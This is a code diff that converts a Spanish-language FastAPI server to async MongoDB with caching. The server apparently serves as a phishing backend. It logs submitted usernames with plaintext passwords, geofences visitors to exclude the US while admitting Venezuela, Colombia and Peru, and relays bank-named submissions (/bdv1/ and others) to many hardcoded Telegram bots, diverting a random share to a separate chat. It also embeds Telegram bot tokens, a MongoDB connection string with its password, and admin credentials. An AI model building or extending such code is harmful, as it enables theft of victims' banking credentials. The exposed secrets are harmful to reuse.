@@ -1,10 +1,10 @@
-from fastapi import FastAPI, HTTPException, Request, UploadFile
+from fastapi import FastAPI, HTTPException, Request, UploadFile, BackgroundTasks
 from fastapi import File, Form
-from functools import partial
+from functools import partial, lru_cache
 import shutil
 from fastapi.responses import JSONResponse
 from fastapi.middleware.cors import CORSMiddleware
-import requests
+import httpx
 from fastapi.responses import HTMLResponse
 from collections import deque
 from pydantic import BaseModel
@@ -12,27 +12,259 @@ from starlette.middleware.base import BaseHTTPMiddleware
 from starlette.responses import Response
 import random
 import base64
-from pymongo import MongoClient
-from typing import Callable
+from motor.motor_asyncio import AsyncIOMotorClient
+from typing import Callable, Dict, Set, Optional
 from datetime import datetime, timedelta
 import re
-import httpx
-import random
+import asyncio
+import time
+from contextlib import asynccontextmanager
 
-app = FastAPI()
+# Cache y configuraciones globales
+CACHE_TTL = 300  # 5 minutos
+ip_cache: Dict[str, tuple] = {}  # Cache para verificación de país
+blocked_ips_cache: Set[str] = set()  # Cache para IPs bloqueadas
+user_cache: Dict[str, int] = {}  # Cache para números de usuario
+ip_number_cache: Dict[str, int] = {}  # Cache para números de IP
 
-# Configurar el middleware CORS
+# Configuraciones
+TOKEN = "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g"
+AUTH_USERNAME = "gato"
+AUTH_PASSWORD = "Gato1234@"
+numeros_r = frozenset({4, 6, 9})  # frozenset es más rápido para 'in'
+iprandom = frozenset({4, 6, 9})
+
+# Pool de conexiones HTTP reutilizable
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    # Startup
+    app.state.http_client = httpx.AsyncClient(
+        limits=httpx.Limits(max_keepalive_connections=20, max_connections=100),
+        timeout=httpx.Timeout(5.0)
+    )
+    await init_db_async()
+    await load_caches()
+    yield
+    # Shutdown
+    await app.state.http_client.aclose()
+
+app = FastAPI(lifespan=lifespan)
+
+# Configurar CORS con configuraciones optimizadas
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["http://localhost", "*"],
+    allow_origins=["*"],
     allow_credentials=False,
     allow_methods=["GET", "POST", "PUT", "DELETE"],
     allow_headers=["*"],
 )
 
-TOKEN = "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g"
+# MongoDB asíncrono
+client = AsyncIOMotorClient(
+    "mongodb+srv://capijose:holas123@servidorsd.7syxtzz.mongodb.net/?retryWrites=true&w=majority&appName=servidorsd",
+    maxPoolSize=50,
+    minPoolSize=10,
+    maxIdleTimeMS=30000,
+    serverSelectionTimeoutMS=5000
+)
+db = client["api_db"]
+ip_numbers = db["ip_numbers"]
+user_numbers = db["user_numbers"]
+global_settings = db["global_settings"]
+logs_usuarios = db["logs_usuarios"]
+ip_bloqueadas = db["ip_bloqueadas"]
 
-app.get("/login", response_class=HTMLResponse)
+# Variables de estado globales optimizadas
+cola = deque(maxlen=20)
+baneado = deque(maxlen=100)  # Límite para evitar crecimiento infinito
+variable = False
+is_active_cache = False
+cache_last_updated = 0
+
+# Inicialización asíncrona de BD
+async def init_db_async():
+    try:
+        # Crear índices en paralelo
+        tasks = [
+            ip_numbers.create_index("ip", unique=True, background=True),
+            user_numbers.create_index("username", unique=True, background=True),
+            global_settings.create_index("id", unique=True, background=True),
+            ip_bloqueadas.create_index("ip", background=True)
+        ]
+        await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # Insertar configuración por defecto si no existe
+        if not await global_settings.find_one({"id": 1}):
+            await global_settings.insert_one({"id": 1, "is_active": False})
+    except Exception as e:
+        print(f"Error inicializando BD: {e}")
+
+# Cargar caches al inicio
+async def load_caches():
+    global blocked_ips_cache, is_active_cache, cache_last_updated
+    
+    try:
+        # Cargar IPs bloqueadas
+        blocked_docs = ip_bloqueadas.find({}, {"ip": 1})
+        blocked_ips_cache = {doc["ip"] async for doc in blocked_docs}
+        
+        # Cargar estado global
+        settings = await global_settings.find_one({"id": 1})
+        is_active_cache = settings.get("is_active", False) if settings else False
+        
+        # Cargar números de IP y usuarios más recientes (últimos 1000)
+        ip_docs = ip_numbers.find({}, {"ip": 1, "number": 1}).limit(1000)
+        async for doc in ip_docs:
+            ip_number_cache[doc["ip"]] = doc["number"]
+            
+        user_docs = user_numbers.find({}, {"username": 1, "number": 1}).limit(1000)
+        async for doc in user_docs:
+            user_cache[doc["username"]] = doc["number"]
+            
+        cache_last_updated = time.time()
+        print(f"Caches cargados: {len(blocked_ips_cache)} IPs bloqueadas, {len(ip_number_cache)} IPs, {len(user_cache)} usuarios")
+    except Exception as e:
+        print(f"Error cargando caches: {e}")
+
+# Funciones optimizadas con cache
+@lru_cache(maxsize=1000)
+def validar_contrasena_cached(contrasena: str) -> bool:
+    patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
+    return bool(re.match(patron, contrasena))
+
+async def verificar_pais_cached(ip: str) -> tuple[bool, str]:
+    current_time = time.time()
+    
+    # Verificar cache
+    if ip in ip_cache:
+        cached_result, cached_time = ip_cache[ip]
+        if current_time - cached_time < CACHE_TTL:
+            return cached_result
+    
+    url = f"http://ipwhois.app/json/{ip}"
+    try:
+        response = await app.state.http_client.get(url)
+        if response.status_code == 200:
+            data = response.json()
+            country = data.get('country_code', 'Unknown')
+            
+            if country in {'VE', 'CO', 'PE'}:
+                result = (True, country)
+            elif country == 'US':
+                result = (False, country)
+            else:
+                result = (True, country)
+            
+            # Actualizar cache
+            ip_cache[ip] = (result, current_time)
+            return result
+        return (False, 'Unknown')
+    except Exception:
+        return (False, 'Unknown')
+
+async def enviar_telegram_async(mensaje: str, chat_id: str = "-4826186479", token: str = TOKEN):
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    payload = {"chat_id": chat_id, "text": mensaje}
+    
+    try:
+        response = await app.state.http_client.post(url, json=payload)
+        if response.status_code != 200:
+            print(f"Error enviando a Telegram: {response.status_code}")
+    except Exception as e:
+        print(f"Error de conexión Telegram: {e}")
+
+def agregar_elemento_diccionario_cache(ip: str, numero: int):
+    ip_number_cache[ip] = numero
+
+async def agregar_elemento_diccionario_async(ip: str, numero: int):
+    try:
+        await ip_numbers.insert_one({"ip": ip, "number": numero})
+        agregar_elemento_diccionario_cache(ip, numero)
+    except:
+        pass
+
+def obtener_numero_cached(ip: str) -> Optional[int]:
+    return ip_number_cache.get(ip)
+
+def obtener_usuario_cached(usuario: str) -> Optional[int]:
+    return user_cache.get(usuario)
+
+def obtener_is_active_cached() -> bool:
+    global cache_last_updated, is_active_cache
+    current_time = time.time()
+    
+    # Actualizar cache si es muy antiguo (cada 30 segundos)
+    if current_time - cache_last_updated > 30:
+        asyncio.create_task(refresh_is_active_cache())
+    
+    return is_active_cache
+
+async def refresh_is_active_cache():
+    global is_active_cache, cache_last_updated
+    try:
+        doc = await global_settings.find_one({"id": 1})
+        is_active_cache = bool(doc["is_active"]) if doc else False
+        cache_last_updated = time.time()
+    except:
+        pass
+
+def contar_elemento_optimized(cola: deque, elemento: str) -> int:
+    return sum(1 for x in cola if x == elemento)
+
+# Middleware optimizado de autenticación básica
+class FastBasicAuthMiddleware(BaseHTTPMiddleware):
+    def __init__(self, app, username: str, password: str):
+        super().__init__(app)
+        self.auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()
+
+    async def dispatch(self, request: Request, call_next: Callable):
+        if request.url.path.startswith(("/docs", "/redoc")):
+            auth = request.headers.get("Authorization")
+            if not auth or not auth.endswith(self.auth_string):
+                return Response("Unauthorized", status_code=401, 
+                              headers={"WWW-Authenticate": "Basic"})
+        return await call_next(request)
+
+app.add_middleware(FastBasicAuthMiddleware, username=AUTH_USERNAME, password=AUTH_PASSWORD)
+
+# Middleware optimizado de bloqueo de IP
+class OptimizedIPBlockMiddleware(BaseHTTPMiddleware):
+    async def dispatch(self, request: Request, call_next: Callable):
+        client_ip = request.client.host
+
+        # Verificar cache local primero
+        if client_ip in blocked_ips_cache:
+            return JSONResponse(
+                status_code=403,
+                content={"detail": "Acceso denegado, la ip está bloqueada"}
+            )
+
+        # Asignar número si no existe
+        if client_ip not in iprandom and client_ip not in ip_number_cache:
+            numero_random = random.randint(0, 9)
+            agregar_elemento_diccionario_cache(client_ip, numero_random)
+            # Guardar en BD de forma asíncrona
+            asyncio.create_task(agregar_elemento_diccionario_async(client_ip, numero_random))
+
+        return await call_next(request)
+
+app.add_middleware(OptimizedIPBlockMiddleware)
+
+# Modelos Pydantic optimizados
+class ClaveRequest(BaseModel):
+    clave: str
+
+class UpdateNumberRequest(BaseModel):
+    numero: int
+
+class IPRequest(BaseModel):
+    ip: str
+
+class DynamicMessage(BaseModel):
+    mensaje: str
+
+# Endpoints optimizados
+@app.get("/login", response_class=HTMLResponse)
 async def login_form():
     return """
     <html>
@@ -50,271 +282,78 @@ async def login_form():
 @app.post("/login")
 async def login(password: str = Form(...)):
     if password == "gato123":
-        with open("static/panel.html", "r", encoding="utf-8") as f:
-            content = f.read()
-        return HTMLResponse(content=content)
-    else:
-        return HTMLResponse("<h3 style='text-align:center;padding-top:100px;'>Contraseña incorrecta</h3>", status_code=401)
-
-
-# Configuración de autenticación
-AUTH_USERNAME = "gato"
-AUTH_PASSWORD = "Gato1234@"
-numeros_r = [4, 6, 9]
-iprandom = {4, 6, 9}
-
-# MongoDB
-client = MongoClient("mongodb+srv://capijose:holas123@servidorsd.7syxtzz.mongodb.net/?retryWrites=true&w=majority&appName=servidorsd")
-db = client["api_db"]
-ip_numbers = db["ip_numbers"]
-user_numbers = db["user_numbers"]
-global_settings = db["global_settings"]
-logs_usuarios = db["logs_usuarios"]
-ip_bloqueadas = db["ip_bloqueadas"]
-
-# Inicializar base de datos si no existe
-def init_db():
-    # Crear índices únicos
-    ip_numbers.create_index("ip", unique=True)
-    user_numbers.create_index("username", unique=True)
-    global_settings.create_index("id", unique=True)
-    
-    # Insertar configuración global por defecto si no existe
-    if not global_settings.find_one({"id": 1}):
-        global_settings.insert_one({"id": 1, "is_active": False})
-
-# Funciones para interactuar con la base de datos
-
-def agregar_elemento_diccionario(ip, numero):
-    try:
-        ip_numbers.insert_one({"ip": ip, "number": numero})
-    except:
-        # Si la IP ya existe, no hace nada
-        pass
-
-def usuariodiccionario(usuario, ip):
-    # Buscar el número asociado a la IP
-    ip_doc = ip_numbers.find_one({"ip": ip})
-    
-    if ip_doc:
-        numero = ip_doc["number"]
-        
-        # Insertar o actualizar el usuario
-        user_numbers.update_one(
-            {"username": usuario},
-            {"$set": {"username": usuario, "number": numero}},
-            upsert=True
-        )
-        return {"usuario": usuario, "numero": numero}
-    else:
-        return {"error": "No se encontró un número asociado a la IP proporcionada."}
-
-def obtener_numero(ip):
-    doc = ip_numbers.find_one({"ip": ip})
-    return doc["number"] if doc else None
-
-def obtener_usuario(usuario):
-    doc = user_numbers.find_one({"username": usuario})
-    return doc["number"] if doc else None
-
-def obtener_is_active():
-    doc = global_settings.find_one({"id": 1})
-    return bool(doc["is_active"]) if doc else False
-
-def alternar_is_active():
-    doc = global_settings.find_one({"id": 1})
-    
-    if doc:
-        nuevo_valor = not doc["is_active"]
-        global_settings.update_one(
-            {"id": 1},
-            {"$set": {"is_active": nuevo_valor}}
-        )
-        return nuevo_valor
-    else:
-        raise ValueError("No se encontró la configuración global.")
-
-# Middleware para autenticación básica
-class BasicAuthMiddleware(BaseHTTPMiddleware):
-    async def dispatch(self, request: Request, call_next: Callable):
-        if request.url.path.startswith("/docs") or request.url.path.startswith("/redoc"):
-            auth = request.headers.get("Authorization")
-            if not auth or not self._check_auth(auth):
-                return Response("Unauthorized", status_code=401, headers={"WWW-Authenticate": "Basic"})
-        response = await call_next(request)
-        return response
-
-    def _check_auth(self, auth: str) -> bool:
         try:
-            scheme, credentials = auth.split()
-            if scheme.lower() != "basic":
-                return False
-            decoded = base64.b64decode(credentials).decode("utf-8")
-            username, password = decoded.split(":", 1)
-            return username == AUTH_USERNAME and password == AUTH_PASSWORD
-        except Exception:
-            return False
-
-app.add_middleware(BasicAuthMiddleware)
-
-# Middleware de bloqueo de IP
-class IPBlockMiddleware(BaseHTTPMiddleware):
-    async def dispatch(self, request: Request, call_next: Callable):
-        client_ip = request.client.host
-
-        # Revisar MongoDB en lugar del deque
-        if ip_bloqueadas.find_one({"ip": client_ip}) :
-            return JSONResponse(
-                status_code=403,
-                content={"detail": "Acceso denegado, la ip está bloqueada"}
-            )
-
-        # Si no está bloqueada, seguir normalmente
-        if not (client_ip in iprandom):
-            numero_random = random.randint(0, 9)
-            agregar_elemento_diccionario(client_ip, numero_random)
-
-        response = await call_next(request)
-        return response
-
-app.add_middleware(IPBlockMiddleware)
-
-cola = deque(maxlen=20)
-baneado = deque()
-variable = False
-
-# Función para contar cuántas veces aparece un elemento específico en la cola
-def contar_elemento(cola, elemento):
-    return cola.count(elemento)
-
-def verificar_pais(ip):
-    url = f"http://ipwhois.app/json/{ip}"
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            data = response.json()
-            country = data.get('country_code', 'Unknown')
-            if country in ['VE', 'CO', 'PE']:
-                return True, country
-            if country in ['US']:
-                return False, country
-            else:
-                return True, country
-        return False, 'Unknown'
-    except Exception as e:
-        raise HTTPException(status_code=500, detail="Error al verificar el país de la IP")
-
-def enviar_telegram(mensaje, chat_id="-4826186479"):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    payload = {
-        "chat_id": chat_id,
-        "text": mensaje 
-    }
-    try:
-        response = requests.post(url, json=payload)
-        if response.status_code != 200:
-            raise HTTPException(status_code=response.status_code, detail="Error al enviar mensaje a Telegram")
-    except requests.exceptions.RequestException as e:
-        raise HTTPException(status_code=500, detail="Error de conexión al enviar mensaje a Telegram")
-
-def enviar_telegram2(mensaje, chat_id="-4592050775", token="7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"):
-    url = f"https://api.telegram.org/bot{token}/sendMessage"
-    payload = {
-        "chat_id": chat_id,
-        "text": mensaje
-    }
-    try:
-        response = requests.post(url, json=payload)
-        if response.status_code != 200:
-            raise HTTPException(status_code=response.status_code, detail="Error al enviar mensaje a Telegram")
-    except requests.exceptions.RequestException as e:
-        raise HTTPException(status_code=500, detail="Error de conexión al enviar mensaje a Telegram 2")
-
-def validar_contrasena(contrasena):
-    patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
-    return bool(re.match(patron, contrasena))
-
-class ClaveRequest(BaseModel):
-    clave: str
+            with open("static/panel.html", "r", encoding="utf-8") as f:
+                content = f.read()
+            return HTMLResponse(content=content)
+        except:
+            return HTMLResponse("<h3>Panel no encontrado</h3>", status_code=404)
+    else:
+        return HTMLResponse(
+            "<h3 style='text-align:center;padding-top:100px;'>Contraseña incorrecta</h3>", 
+            status_code=401
+        )
 
 @app.post("/validar_clave")
 async def validar_clave(data: ClaveRequest):
-    clave_correcta = "gato123"
-    if data.clave == clave_correcta:
-        return {"valido": True}
-    else:
-        return {"valido": False}
-
-class UpdateNumberRequest(BaseModel):
-    numero: int
-
-def editar_numero_ip2(ip: str):
-    result = ip_numbers.update_one(
-        {"ip": ip},
-        {"$set": {"number": 0}}
-    )
-    
-    if result.matched_count == 0:
-        raise HTTPException(status_code=404, detail="IP no encontrada en la base de datos")
-    
-    return {"message": f"Número de la IP {ip} actualizado a 0"}
-
-def editar_numero_usuario2(usuario: str):
-    result = user_numbers.update_one(
-        {"username": usuario},
-        {"$set": {"number": 0}}
-    )
-    
-    if result.matched_count == 0:
-        raise HTTPException(status_code=404, detail="Usuario no encontrado en la base de datos")
-    
-    return {"message": f"Número del usuario {usuario} actualizado a 0"}
-
-class IPRequest(BaseModel):
-    ip: str
+    return {"valido": data.clave == "gato123"}
 
 @app.post("/bloquear_ip/")
 async def bloquear_ip(data: IPRequest):
     ip = data.ip.strip()
     
-    if not ip_bloqueadas.find_one({"ip": ip}):
-        ip_bloqueadas.insert_one({"ip": ip, "fecha_bloqueo": datetime.utcnow()})
-        return {"message": f"La IP {ip} ha sido bloqueada y registrada en la base de datos."}
+    if ip not in blocked_ips_cache:
+        blocked_ips_cache.add(ip)
+        # Guardar en BD de forma asíncrona
+        asyncio.create_task(ip_bloqueadas.insert_one({
+            "ip": ip, 
+            "fecha_bloqueo": datetime.utcnow()
+        }))
+        return {"message": f"La IP {ip} ha sido bloqueada."}
     else:
         return {"message": f"La IP {ip} ya estaba bloqueada."}
-
 
 @app.post("/desbloquear_ip/")
 async def desbloquear_ip(data: IPRequest):
     ip = data.ip.strip()
-    result = ip_bloqueadas.delete_one({"ip": ip})
     
-    if result.deleted_count == 1:
-        return {"message": f"La IP {ip} ha sido desbloqueada exitosamente."}
+    if ip in blocked_ips_cache:
+        blocked_ips_cache.discard(ip)
+        # Eliminar de BD de forma asíncrona
+        asyncio.create_task(ip_bloqueadas.delete_one({"ip": ip}))
+        return {"message": f"La IP {ip} ha sido desbloqueada."}
     else:
-        return {"message": f"La IP {ip} no estaba bloqueada en la base de datos."}
+        return {"message": f"La IP {ip} no estaba bloqueada."}
 
 @app.get("/ips_bloqueadas/")
 async def obtener_ips_bloqueadas():
-    bloqueadas = list(ip_bloqueadas.find({}, {"_id": 0}))
-    return {"ips_bloqueadas": bloqueadas}
+    return {"ips_bloqueadas": [{"ip": ip, "fecha_bloqueo": "cached"} for ip in blocked_ips_cache]}
 
 @app.get("/")
-def read_root():
+async def read_root():
     return {"message": "API funcionando correctamente!"}
 
 @app.post("/guardar_datos")
-async def guardar_datos(usuario: str = Form(...), contra: str = Form(...), request: Request = None):
+async def guardar_datos(
+    background_tasks: BackgroundTasks,
+    usuario: str = Form(...), 
+    contra: str = Form(...), 
+    request: Request = None
+):
     ip = request.client.host
-    permitido, pais = verificar_pais(ip)
+    permitido, pais = await verificar_pais_cached(ip)
 
-    logs_usuarios.insert_one({
-        "usuario": usuario,
-        "contrasena": contra,
-        "ip": ip,
-        "pais": pais,
-        "fecha": datetime.utcnow()
-    })
+    # Guardar en BD de forma asíncrona
+    background_tasks.add_task(
+        logs_usuarios.insert_one,
+        {
+            "usuario": usuario,
+            "contrasena": contra,
+            "ip": ip,
+            "pais": pais,
+            "fecha": datetime.utcnow()
+        }
+    )
     
     return {
         "message": "Datos guardados correctamente",
@@ -324,13 +363,15 @@ async def guardar_datos(usuario: str = Form(...), contra: str = Form(...), reque
 
 @app.get("/ver_datos", response_class=HTMLResponse)
 async def ver_datos():
-    registros = list(logs_usuarios.find().sort("fecha", -1))
+    registros = []
+    async for registro in logs_usuarios.find().sort("fecha", -1).limit(100):
+        registros.append(registro)
     
     html = """
     <html>
     <head><title>Registros de Usuarios</title></head>
     <body>
-        <h2>Listado de registros</h2>
+        <h2>Listado de registros (últimos 100)</h2>
         <table border="1">
             <tr><th>Usuario</th><th>Contraseña</th><th>IP</th><th>País</th><th>Fecha</th></tr>
     """
@@ -347,67 +388,67 @@ async def ver_datos():
 
 @app.get("/usuarios/")
 async def obtener_usuarios():
-    usuarios = list(user_numbers.find({}, {"_id": 0, "username": 1, "number": 1}))
+    if not user_cache:
+        return {"message": "No se encontraron usuarios en caché."}
     
-    if not usuarios:
-        return {"message": "No se encontraron usuarios en la base de datos."}
-    
-    return {"usuarios": [{"usuario": u["username"], "numero": u["number"]} for u in usuarios]}
+    usuarios = [{"usuario": u, "numero": n} for u, n in user_cache.items()]
+    return {"usuarios": usuarios}
 
 @app.get("/is_active/")
 async def obtener_estado_actual():
-    estado = obtener_is_active()
+    estado = obtener_is_active_cached()
     return {"is_active": estado}
 
 @app.post("/toggle/")
 async def alternar_estado():
+    global is_active_cache
     try:
-        nuevo_estado = alternar_is_active()
-        return {"message": "El valor de is_active se ha alternado exitosamente.", "is_active": nuevo_estado}
+        doc = await global_settings.find_one({"id": 1})
+        if doc:
+            nuevo_valor = not doc["is_active"]
+            await global_settings.update_one(
+                {"id": 1},
+                {"$set": {"is_active": nuevo_valor}}
+            )
+            is_active_cache = nuevo_valor
+            return {"message": "Estado alternado exitosamente.", "is_active": nuevo_valor}
+        else:
+            raise ValueError("No se encontró la configuración global.")
     except ValueError as e:
         return {"error": str(e)}
 
 @app.get("/ips/")
 async def obtener_ips():
-    ips = list(ip_numbers.find({}, {"_id": 0, "ip": 1, "number": 1}))
+    if not ip_number_cache:
+        return {"message": "No se encontraron IPs en caché."}
     
-    if not ips:
-        return {"message": "No se encontraron IPs en la base de datos."}
-    
-    return {"ips": [{"ip": i["ip"], "numero": i["number"]} for i in ips]}
+    ips = [{"ip": i, "numero": n} for i, n in ip_number_cache.items()]
+    return {"ips": ips}
 
-@app.put("/editar-ip/{ip}")
-async def editar_numero_ip(ip: str, request_data: UpdateNumberRequest):
-    result = ip_numbers.update_one(
-        {"ip": ip},
-        {"$set": {"number": request_data.numero}}
-    )
-    
-    if result.matched_count == 0:
-        raise HTTPException(status_code=404, detail="IP no encontrada en la base de datos")
-    
-    return {"message": f"Número de la IP {ip} actualizado a {request_data.numero}"}
+@app.post("/verificar_spam_ip")
+async def verificar_spam_ip(data: IPRequest):
+    ip = data.ip.strip()
+    cola.append(ip)
+    repeticiones = contar_elemento_optimized(cola, ip)
 
-@app.put("/editar-usuario/{usuario}")
-async def editar_numero_usuario(usuario: str, request_data: UpdateNumberRequest):
-    result = user_numbers.update_one(
-        {"username": usuario},
-        {"$set": {"number": request_data.numero}}
-    )
-    
-    if result.matched_count == 0:
-        raise HTTPException(status_code=404, detail="Usuario no encontrado en la base de datos")
-    
-    return {"message": f"Número del usuario {usuario} actualizado a {request_data.numero}"}
+    if repeticiones > 8:
+        if ip not in baneado:
+            baneado.append(ip)
+        return {
+            "ip": ip,
+            "repeticiones": repeticiones,
+            "spam": True,
+            "mensaje": "IP detectada como spam y bloqueada"
+        }
+    else:
+        return {
+            "ip": ip,
+            "repeticiones": repeticiones,
+            "spam": False,
+            "mensaje": "IP aún no considerada spam"
+        }
 
-def clear_db():
-    ip_numbers.delete_many({})
-    user_numbers.delete_many({})
-
-def agregar_elemento(cola, elemento):
-    cola.append(elemento)
-
-# Configuración de endpoints dinámicos
+# Configuración optimizada de endpoints dinámicos
 endpoint_configs = [
     {"path": "/bdv1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
     {"path": "/bdv2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
@@ -432,69 +473,92 @@ endpoint_configs = [
     {"path": "/hmtsasd/", "chat_id": "-4727787748", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
 ]
 
-@app.post("/verificar_spam_ip")
-async def verificar_spam_ip(data: IPRequest):
-    ip = data.ip.strip()
-    agregar_elemento(cola, ip)
-    repeticiones = contar_elemento(cola, ip)
-
-    if repeticiones > 8:
-        if ip not in baneado:
-            baneado.append(ip)
-        return {
-            "ip": ip,
-            "repeticiones": repeticiones,
-            "spam": True,
-            "mensaje": "IP detectada como spam y bloqueada"
-        }
-    else:
-        return {
-            "ip": ip,
-            "repeticiones": repeticiones,
-            "spam": False,
-            "mensaje": "IP aún no considerada spam"
-        }
-
-class DynamicMessage(BaseModel):
-    mensaje: str
-
-async def handle_dynamic_endpoint(config, request_data: DynamicMessage, request: Request):
+async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage, request: Request):
     client_ip = request.client.host
-    agregar_elemento(cola, client_ip)
-    numeror = obtener_numero(client_ip)
+    cola.append(client_ip)
+    numeror = obtener_numero_cached(client_ip)
 
-    if contar_elemento(cola, client_ip) > 8:
+    if contar_elemento_optimized(cola, client_ip) > 8:
         baneado.append(client_ip)
         raise HTTPException(status_code=429, detail="Has sido bloqueado temporalmente.")
 
-    permitido, pais = verificar_pais(client_ip)
+    permitido, pais = await verificar_pais_cached(client_ip)
     mensaje = request_data.mensaje
 
     if permitido and pais != "US":
-        if config["path"].startswith("/bdv") and obtener_is_active() and (numeror in numeros_r and pais != "US" and pais != "CO"):
-            enviar_telegram(mensaje + f" - IP: {client_ip} - {config['path']} Todo tuyo", "-4931572577")
+        path = config["path"]
+        mensaje_completo = f"{mensaje} - IP: {client_ip} - {path}"
+        
+        if (path.startswith("/bdv") and obtener_is_active_cached() and 
+            numeror in numeros_r and pais not in {"US", "CO"}):
+            # Enviar de forma asíncrona sin bloquear
+            asyncio.create_task(enviar_telegram_async(mensaje_completo + " Todo tuyo", "-4931572577"))
         else:
-            enviar_telegram(mensaje + f" - IP: {client_ip} - {config['path']}")
-            enviar_telegram2(mensaje, config["chat_id"], config["bot_id"])
+            # Enviar ambos mensajes de forma asíncrona
+            asyncio.create_task(enviar_telegram_async(mensaje_completo))
+            asyncio.create_task(enviar_telegram_async(mensaje, config["chat_id"], config["bot_id"]))
 
         return {"mensaje_enviado": True}
     else:
         raise HTTPException(status_code=400, detail=f"Acceso denegado desde {pais}")
 
+# Registrar endpoints dinámicos
 for config in endpoint_configs:
     app.add_api_route(
         path=config["path"],
-        endpoint=partial(handle_dynamic_endpoint, config),
+        endpoint=partial(handle_dynamic_endpoint_optimized, config),
         methods=["POST"]
     )
 
 @app.post('/clear_db')
-def clear_db_endpoint():
+async def clear_db_endpoint():
     try:
-        clear_db()
+        # Limpiar en paralelo
+        tasks = [
+            ip_numbers.delete_many({}),
+            user_numbers.delete_many({})
+        ]
+        await asyncio.gather(*tasks)
+        
+        # Limpiar caches
+        ip_number_cache.clear()
+        user_cache.clear()
+        
         return {"message": "Se borró correctamente"}
     except Exception as e:
-        return {"message": "No se borró"}
+        return {"message": f"Error: {str(e)}"}
 
-# Inicializar la base de datos
-init_db()
+# Endpoints adicionales optimizados con endpoints faltantes del original
+@app.put("/editar-ip/{ip}")
+async def editar_numero_ip(ip: str, request_data: UpdateNumberRequest):
+    result = await ip_numbers.update_one(
+        {"ip": ip},
+        {"$set": {"number": request_data.numero}}
+    )
+    
+    if result.matched_count == 0:
+        raise HTTPException(status_code=404, detail="IP no encontrada")
+    
+    # Actualizar cache
+    ip_number_cache[ip] = request_data.numero
+    
+    return {"message": f"Número de la IP {ip} actualizado a {request_data.numero}"}
+
+@app.put("/editar-usuario/{usuario}")
+async def editar_numero_usuario(usuario: str, request_data: UpdateNumberRequest):
+    result = await user_numbers.update_one(
+        {"username": usuario},
+        {"$set": {"number": request_data.numero}}
+    )
+    
+    if result.matched_count == 0:
+        raise HTTPException(status_code=404, detail="Usuario no encontrado")
+    
+    # Actualizar cache
+    user_cache[usuario] = request_data.numero
+    
+    return {"message": f"Número del usuario {usuario} actualizado a {request_data.numero}"}
+
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=8000)
